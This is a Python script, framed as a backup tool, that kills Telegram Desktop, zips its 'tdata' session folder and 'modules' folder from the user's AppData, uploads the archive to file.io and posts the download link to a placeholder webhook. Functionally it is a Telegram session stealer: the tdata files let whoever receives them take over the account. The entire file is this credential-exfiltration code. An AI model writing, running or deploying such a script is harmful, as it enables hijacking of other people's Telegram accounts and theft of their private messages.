import os
import zipfile
import requests
import psutil

# Function to count total files in a folder
def count_files(folder_path):
    total_files = 0
    for root, dirs, files in os.walk(folder_path):
        total_files += len(files)
    return total_files

# Function to zip a folder with progress
def zip_folder_with_progress(folder_path, zipf):
    total_files = count_files(folder_path)
    processed_files = 0
    update_interval = 50  # Update progress every 50 files

    for root, dirs, files in os.walk(folder_path):
        for file in files:
            file_path = os.path.join(root, file)
            arcname = os.path.relpath(file_path, folder_path)
            zipf.write(file_path, arcname)
            
            processed_files += 1
            if processed_files % update_interval == 0:
                progress = (processed_files / total_files) * 100
                print(f"Progress: {progress:.2f}% ({processed_files}/{total_files})", end="\r")
    print("\nCompression complete!")

# Function to find Telegram folders
def find_telegram_folders():
    user_profile = os.getenv("USERPROFILE")
    telegram_root = os.path.join(user_profile, "AppData", "Roaming", "Telegram Desktop")

    # Check if Telegram folder exists and contains necessary subfolders
    if os.path.exists(telegram_root):
        print(f"Found Telegram Desktop folder: {telegram_root}")
        
        modules_path = os.path.join(telegram_root, "modules")
        tdata_path = os.path.join(telegram_root, "tdata")
        
        # If both subfolders exist, return them
        if os.path.exists(modules_path) and os.path.exists(tdata_path):
            return [modules_path, tdata_path]
        else:
            return []  # If folders are not found, return an empty list
    else:
        return []  # Return empty if Telegram root folder is not found

# Function to check and kill the Telegram process if it's running
def kill_telegram_process():
    for proc in psutil.process_iter(['pid', 'name']):
        if 'Telegram' in proc.info['name']:  # Check if Telegram is running
            print(f"Killing Telegram process (PID: {proc.info['pid']})...")
            proc.kill()  # Kill the process
            print("Telegram process killed successfully.")
            break
    else:
        print("No Telegram process found.")

# Function to upload file to file.io and get the URL
def upload_to_fileio(file_path):
    if not os.path.exists(file_path):  # Check if the file exists
        print(f"Error: File {file_path} not found.")
        return None

    url = "https://file.io"
    try:
        with open(file_path, 'rb') as f:  # Open file properly
            files = {'file': f}
            response = requests.post(url, files=files)
        
        if response.status_code == 200:
            data = response.json()
            if data.get("success"):
                return data["link"]
    except Exception as e:
        print(f"Error uploading file: {e}")
    return None

# Function to send message to Webhook
def send_to_webhook(webhook_url, message):
    data = {
        "content": message
    }
    response = requests.post(webhook_url, json=data)
    if response.status_code != 204:
        print(f"Error sending message: {response.text}")
    else:
        print("Message sent successfully to Webhook.")

# Main function to process everything
def main():
    # Kill Telegram process if it's running
    kill_telegram_process()

    folders_to_zip = find_telegram_folders()
    
    if folders_to_zip:
        temp_folder = os.getenv('TEMP')
        output_zip = os.path.join(temp_folder, "telegram_folders_backup.zip")

        print(f"Creating ZIP archive at: {output_zip}")
        
        with zipfile.ZipFile(output_zip, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for folder in folders_to_zip:
                zip_folder_with_progress(folder, zipf)

        # Upload the zip file to file.io
        print("Uploading to file.io...")
        download_link = upload_to_fileio(output_zip)

        if download_link:
            print(f"File uploaded successfully. Download link: {download_link}")

            # Send the download link to Webhook
            webhook_url = "WEBHOOKS_URL"  # Replace with your Webhook URL
            send_to_webhook(webhook_url, f"Download your backup here: {download_link}")
        else:
            print("Failed to upload the file.")
    else:
        print("Telegram folders not found or are incomplete.")

if __name__ == "__main__":
    main()
